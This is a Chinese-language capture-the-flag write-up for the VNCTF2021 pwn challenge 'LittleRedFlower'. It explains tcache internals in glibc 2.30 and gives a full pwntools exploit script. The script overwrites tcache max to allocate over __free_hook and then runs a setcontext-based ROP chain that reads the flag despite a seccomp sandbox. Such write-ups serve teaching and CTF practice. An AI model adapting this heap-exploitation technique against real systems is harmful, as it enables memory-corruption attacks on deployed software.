
# [原创]【VNCTF2021】LittleRedFlower

题目：buuoj上可搜

![](https://bbs.kanxue.com/upload/attach/202204/943085_N3H9MEKMRUXPJXW.jpg)

## 前置知识

### tcache是如何取堆块的

首先会通过`csize2tidx`函数算出输入的`size`对应的`idx`，判断`idx`是否比`tcache max`小，小的话去检测`[top+idx*2]`（`counts`）是否为0。如果不为0就拿出`[top+idx*8]`然后返回

### 关于csize2tidx

还是看汇编来得快，glibc的源码太难看了

![](https://bbs.kanxue.com/upload/attach/202204/943085_72N2GS74R5A7PHV.jpg)

0x1530是我们输入的`size`，`shr`指令是二进制下右移4位，等价于十六进制右移1位

### 对于counts的检测

![](https://bbs.kanxue.com/upload/attach/202204/943085_JJNZ6EE6NPNQ3XH.jpg)

### 关于通过idx寻找取出堆块的地址

![](https://bbs.kanxue.com/upload/attach/202204/943085_3CTTEN55DGR27MM.jpg)

`r8`是取出的`chunk`的地址

![](https://bbs.kanxue.com/upload/attach/202204/943085_6X4BWQEHJV4YMGF.jpg)

从后面的`ret`前的指令也可以看出，`r8`就是我们取出的堆块的地址

## 题解

### glibc版本

2.30-2.2

### 保护

![](https://bbs.kanxue.com/upload/attach/202204/943085_KFQCTU5CMRTFWHH.jpg)

### 沙箱保护

![](https://bbs.kanxue.com/upload/attach/202204/943085_Y24UU9AU8F94C7H.jpg)

### ida

![](https://bbs.kanxue.com/upload/attach/202204/943085_AA9SN6T2D8NZA6V.jpg)

![](https://bbs.kanxue.com/upload/attach/202204/943085_CX9UT829JYNQ53U.jpg)

主要的功能有任意地址写1字节，任意堆地址写8字节，申请一个可写的堆块并且`free`它

### gift

![](https://bbs.kanxue.com/upload/attach/202204/943085_WSB2FA87HNCTW9H.jpg)

白给的`libc`

### 思路

主要就是打`tcache max`，并且控制`indx`指向的位置，使得申请出来的可写堆块为`free_hook`，然后配合`mov rdx,[rdi+8]`的gadget和`setcontext+61`以及`orw`直接打通

### exp

```python
from pwn import \*
from LibcSearcher import \*
from pwnlib.util.iters import mbruteforce
from hashlib import sha256
import base64
context.log\_level='debug'
##context.terminal = ["tmux", "splitw", "-h"]
context.arch = 'amd64'
context.os = 'linux'
def proof\_of\_work(sh):
sh.recvuntil(" == ")
cipher = sh.recvline().strip().decode("utf8")
proof = mbruteforce(lambda x: sha256((x).encode()).hexdigest() == cipher, string.ascii\_letters + string.digits, length=4, method='fixed')
sh.sendlineafter("input your ????>", proof)
##r = remote("chuj.top", 51904)
##proof\_of\_work(r)
libc=ELF('./libc.so.6')
r=process('./pwn')
def z():
gdb.attach(r)
def read\_byte(add,char):
r.sendafter('You can write a byte anywhere',p64(add))
r.sendafter('And what?',str(char))
def write\_near\_heap(offset,con):
r.sendlineafter("Offset:",str(offset))
r.sendafter("Content:\n",con)
def make\_room(size,con):
r.sendafter("size:",str(size))
r.sendafter(">>",con)
## recv\_libc
r.recvuntil('GIFT: ')
libcbase=int(r.recvline()[:-1],base=16)-0x1eb6a0
log.success('libcbase:'+hex(libcbase))
## set
tcache\_max=libcbase+0x1ea2d0
free\_hook=libcbase+libc.sym['\_\_free\_hook']
setcontext=libcbase+libc.sym['setcontext']
mov\_rdx\_call=libcbase+0x154b20
##0x0000000000154b20: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];
pat=libcbase+0x28ff4 #pop rax; ret;
pdt=libcbase+0x26bb2 #pop rdi; ret;
pst=libcbase+0x2709c #pop rsi; ret;
pd12t=libcbase+0x11c3b1 #pop rdx; pop r12; ret;
syscall=libcbase+0x66199 #syscall; ret;
ret=libcbase+0x256b9
## change\_tcache\_max
read\_byte(tcache\_max+7,1)
## write\_sth\_near\_the\_heap
write\_near\_heap(0x830,p64(free\_hook))
##orw
orw=p64(pat)+p64(2)+p64(pdt)+p64(free\_hook+0x10)+p64(syscall)+\
p64(pat)+p64(0)+p64(pdt)+p64(3)+p64(pst)+p64(free\_hook+0xb0)+p64(pd12t)+p64(0x50)+p64(0)+p64(syscall)+\
p64(pat)+p64(1)+p64(pdt)+p64(1)+p64(pst)+p64(free\_hook+0xb0)+p64(pd12t)+p64(0x50)+p64(0)+p64(syscall)+p64(0xdeadbeef)
## make room
pd=p64(mov\_rdx\_call)+p64(free\_hook-0x8)+'./flag'.ljust(8,'\x00')+p64(setcontext+61)
pd=pd.ljust(0x98,'\x00')
pd+=p64(free\_hook+0xa8)
pd+=p64(ret)
pd+=orw
z()
make\_room(0x1490,pd)
r.recvuntil('flag')
flag='flag'+r.recv()
print(flag)
r.interactive()
```
